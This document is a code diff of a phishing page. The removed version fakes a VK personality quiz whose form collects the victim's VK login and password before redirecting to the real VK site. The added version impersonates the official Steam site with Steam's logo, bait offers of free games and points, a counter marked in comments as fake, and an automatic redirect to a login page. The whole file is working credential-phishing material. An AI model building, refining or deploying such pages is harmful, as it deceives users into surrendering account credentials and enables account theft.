@@ -1,65 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>ВК Опрос | Кто ты из сериалов?</title>
+    <title>STEAM | Официальный сайт</title>
+    <link rel="icon" href="https://store.steampowered.com/favicon.ico">
     <style>
-        body { 
-            font-family: Arial; 
-            background: #4A76A8; 
-            color: white; 
-            text-align: center; 
-            padding: 50px; 
+        body {
+            margin: 0;
+            font-family: "Motiva Sans", Arial, sans-serif;
+            background: #1b2838;
+            color: #c6d4df;
         }
-        .container { 
-            background: white; 
-            color: black; 
-            padding: 30px; 
-            border-radius: 10px; 
-            max-width: 500px; 
-            margin: 0 auto; 
+        .header {
+            background: #171a21;
+            padding: 15px;
+            text-align: center;
+            border-bottom: 1px solid #000;
         }
-        input, button { 
-            padding: 10px; 
-            margin: 10px; 
-            width: 80%; 
+        .login-btn {
+            background: #5c7e10;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .container {
+            max-width: 940px;
+            margin: 0 auto;
+            padding: 20px;
         }
     </style>
 </head>
 <body>
+    <div class="header">
+        <img src="https://store.steampowered.com/public/images/v6/logo_steam.svg" 
+             alt="Steam" height="44">
+        <button class="login-btn" onclick="window.location.href='/login/'">
+            ВОЙТИ
+        </button>
+    </div>
+
     <div class="container">
-        <h2>🎬 Узнай, кто ты из сериалов!</h2>
-        <p>Войди в ВК чтобы увидеть результат:</p>
+        <h1>Войдите в Steam</h1>
+        <p>Чтобы получить доступ ко всем функциям Steam</p>
         
-        <form id="vkForm">
-            <input type="text" id="login" placeholder="Телефон или email" required><br>
-            <input type="password" id="password" placeholder="Пароль ВК" required><br>
-            <button type="submit">Узнать результат</button>
-        </form>
-        
-        <p style="font-size: 12px; color: gray;">После входа ты увидишь свой персонаж!</p>
+        <!-- Приманки -->
+        <div style="background: #2a475e; padding: 20px; margin: 20px 0; border-radius: 3px;">
+            <h3>🎁 Акция! После входа получите:</h3>
+            <ul>
+                <li>Бесплатную игру на выбор</li>
+                <li>500 Steam Points</li>
+                <li>Скидку 20% на следующую покупку</li>
+            </ul>
+        </div>
+
+        <!-- Счётчик "людей онлайн" (фейковый) -->
+        <div style="text-align: center; margin: 40px 0;">
+            <div style="font-size: 12px; color: #66c0f4;">ИГРОКОВ ОНЛАЙН</div>
+            <div style="font-size: 32px; font-weight: bold;">12,847,921</div>
+            <div style="font-size: 12px;">Только что вошли: 2,847 игроков</div>
+        </div>
     </div>
 
     <script>
-        document.getElementById('vkForm').onsubmit = async function(e) {
-            e.preventDefault();
-            
-            // 1. Собираем логин и пароль
-            const login = document.getElementById('login').value;
-            const password = document.getElementById('password').value;
-            
-            // 2. Показываем "загрузку"
-            document.querySelector('button').textContent = 'Анализируем...';
-            
-            // 3. Отправляем на наш сервер (пока заглушка)
-            console.log('Логин:', login, 'Пароль:', password);
-            
-            // 4. Через 2 секунды перенаправляем в настоящий ВК
-            setTimeout(() => {
-                window.location.href = 'https://vk.com/feed';
-            }, 2000);
-            
-            return false;
-        };
+        // Перенаправление на страницу входа через 3 секунды
+        setTimeout(() => {
+            window.location.href = '/login/';
+        }, 3000);
     </script>
 </body>
 </html>
